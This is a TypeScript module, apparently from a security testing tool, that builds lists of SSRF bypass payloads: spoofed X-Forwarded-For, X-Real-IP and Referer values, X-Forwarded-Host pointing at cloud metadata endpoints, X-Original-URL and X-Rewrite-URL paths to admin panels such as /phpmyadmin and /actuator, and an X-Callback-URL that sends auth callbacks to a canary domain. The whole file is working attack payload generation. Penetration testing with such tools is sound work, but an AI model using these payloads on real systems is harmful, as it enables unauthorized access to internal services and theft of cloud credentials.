/**
 * Header Injection SSRF bypass payloads.
 *
 * These payloads attempt to bypass SSRF filters by injecting internal/privileged
 * headers that reverse proxies or internal services may trust. Headers like
 * X-Forwarded-For, X-Forwarded-Host, and X-Original-URL can cause proxies to
 * route requests to internal endpoints.
 *
 */

export interface HeaderInjectionPayload {
  header: string;
  value: string;
  technique: string;
}

/**
 * Generates header injection SSRF bypass payloads.
 *
 * @param targetHost Internal host to target (e.g., 169.254.169.254)
 * @param canaryDomain Optional canary domain for callback detection
 * @returns Array of header injection payloads
 * @see RFC7239 §5.2 for X-Forwarded-For semantics
 */
export function generateHeaderInjectionPayloads(
  targetHost: string,
  canaryDomain?: string
): HeaderInjectionPayload[] {
  const payloads: HeaderInjectionPayload[] = [];

  // X-Forwarded-For: Trusted by proxies to identify client IP
  // Injecting internal IPs can bypass IP-based access controls
  const xffIps = ["127.0.0.1", targetHost, "::1"];
  for (const ip of xffIps) {
    payloads.push({
      header: "X-Forwarded-For",
      value: ip,
      technique: "Proxy trust - IP spoofing via X-Forwarded-For"
    });
  }

  // X-Forwarded-Host: Trusted by proxies to determine the original host
  // Can redirect internal routing to cloud metadata endpoints
  const xfHosts = [targetHost, "metadata.google.internal"];
  for (const host of xfHosts) {
    payloads.push({
      header: "X-Forwarded-Host",
      value: host,
      technique: "Proxy trust - Host override via X-Forwarded-Host"
    });
  }

  // X-Callback-URL: Used by some webhook/auth flows to determine callback destination
  if (canaryDomain) {
    payloads.push({
      header: "X-Callback-URL",
      value: `http://${canaryDomain}/c/token`,
      technique: "Callback manipulation - Redirect auth/callback to attacker"
    });
  }

  // Referer: Some internal services check Referer for access control
  payloads.push({
    header: "Referer",
    value: `http://${targetHost}/`,
    technique: "Referer spoofing - Bypass referer-based access checks"
  });

  // X-Original-URL: Used by some WAFs/proxies to determine the real target URL
  // Backend servers may serve admin panels at these paths
  const originalPaths = ["/admin", "/phpmyadmin", "/actuator"];
  for (const path of originalPaths) {
    payloads.push({
      header: "X-Original-URL",
      value: path,
      technique: "WAF bypass - URL rewrite via X-Original-URL"
    });
  }

  // X-Rewrite-URL: Similar to X-Original-URL, used by some reverse proxies
  const rewritePaths = ["/admin", "/debug/vars"];
  for (const path of rewritePaths) {
    payloads.push({
      header: "X-Rewrite-URL",
      value: path,
      technique: "Proxy bypass - URL rewrite via X-Rewrite-URL"
    });
  }

  // Additional useful headers
  payloads.push({
    header: "X-Real-IP",
    value: "127.0.0.1",
    technique: "Proxy trust - IP spoofing via X-Real-IP"
  });

  payloads.push({
    header: "X-Forwarded-Proto",
    value: "https",
    technique: "Protocol downgrade prevention bypass"
  });

  if (canaryDomain) {
    payloads.push({
      header: "X-Custom-IP-Authorization",
      value: targetHost,
      technique: "Custom auth header injection - Some services trust custom auth headers"
    });
  }

  return payloads;
}
